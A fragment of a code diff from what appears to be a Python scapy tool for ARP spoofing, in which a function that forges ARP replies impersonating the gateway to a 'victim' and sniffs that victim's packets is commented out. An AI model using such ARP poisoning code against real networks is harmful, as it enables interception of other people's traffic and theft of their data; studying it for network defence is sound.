@@ -10,32 +10,32 @@ from utils import get_local_mac_address
 from states import get_tracking_state, get_is_tracked, change_is_tracked_state, change_tracking_state
 
 victims_data_by_ips = {}
-thread_stops_flags = {}
+# thread_stops_flags = {}
 
 
-def handle_victim_sniff(packet, victim_ip):
-    if IP in packet and packet[IP].src == victim_ip:
-        # Process or print information about the captured packet
-        print(packet.summary())
+# def handle_victim_sniff(packet, victim_ip):
+#     if IP in packet and packet[IP].src == victim_ip:
+#         # Process or print information about the captured packet
+#         print(packet.summary())
 
 
-def victim_caught(victim_ip, victim_mac, gateway_ip, my_mac):
-    """
-    :param victim_ip:
-    :param gateway_ip:
-    :param victim_mac:
-    :param my_mac:
-    :return:
-    """
-    change_is_tracked_state(True)
-    arp_segment_to_victim = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, hwsrc=my_mac, psrc=gateway_ip)
+# def victim_caught(victim_ip, victim_mac, gateway_ip, my_mac):
+#     """
+#     :param victim_ip:
+#     :param gateway_ip:
+#     :param victim_mac:
+#     :param my_mac:
+#     :return:
+#     """
+#     change_is_tracked_state(True)
+#     arp_segment_to_victim = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, hwsrc=my_mac, psrc=gateway_ip)
 
-    sniff_victim_handler = lambda packet: handle_victim_sniff(packet, victim_ip)
-    sniff(filter=f"src {victim_ip}", prn=sniff_victim_handler)
+#     sniff_victim_handler = lambda packet: handle_victim_sniff(packet, victim_ip)
+#     sniff(filter=f"src {victim_ip}", prn=sniff_victim_handler)
 
-    for _ in range(4):
-        scapy.send(arp_segment_to_victim)
-        time.sleep(0.5)
+#     for _ in range(4):
+#         scapy.send(arp_segment_to_victim)
+#         time.sleep(0.5)
 
 
 def handles_arp_requests(packet, gateway_ip, local_mac):
